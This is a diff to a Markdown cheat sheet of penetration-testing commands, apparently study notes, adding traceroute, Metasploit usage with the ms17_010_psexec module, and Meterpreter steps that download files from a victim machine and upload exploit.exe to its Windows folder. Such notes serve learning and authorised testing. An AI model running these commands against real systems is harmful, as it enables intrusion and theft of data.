@@ -33,7 +33,11 @@ ifconfig            #linux
 ```sh
 ping 10.10.10.10     #allow a user to test and verify if a destination IP Address exists 
 ```
-
+**Using to Trace the Route an IP Packet**
+```sh
+tracert    google.com     #Windows 
+traceroute google.com     #Linux
+```
 **Checking for ARP Tables**
 ```sh
 arp -a               #To show ARP Tables Windows 
@@ -191,6 +195,18 @@ put filename               #to upload file
 cd /../..                  #to Change remote working directory
 ls /..                     #to List contents of remote directory
 ```
+## Metasploit Project
+```sh
+msfconsole                        #To run the Freamwork
+search <Exploit_Module>           #Search for a specific module 
+show exploits                     #Aonther way to display exploits
+show payloads                     #display payloads
+use exploit/windows/smb/ms17_010_psexec        #to use exploit 
+show options                      #Check options and required value
+set <OpationName> value           #To configure an option
+exploit                           #Execution of exploitation
+``` 
+
 ## Meterpreter
 ```sh
 ps
@@ -198,6 +214,11 @@ getuid
 getpid
 getsystem
 search -f *.txt     #search file 
+download Filename /root/****               #Download From victm machine to your machine 
+upload   /****/exploit.exe C://Windows     #Upload from your machine to victm machine   
+shell               #run a standard operating system shell 
+sysinfo             #information about the victm Machine 
+background          #Switch from a Meterpreter session to the msfconsole command line 
 ```
 **CHECK UAC/Privileges**
 ```sh
@@ -228,6 +249,7 @@ dir /b/s "\*.txt\*"
 dir /b/s "\*filename\*"
 cd         #it's the same as 'pwd' command in linux
 type       #it's the same as 'cat' command in linux
+systeminfo #information about the Operating System
 ```
 
 
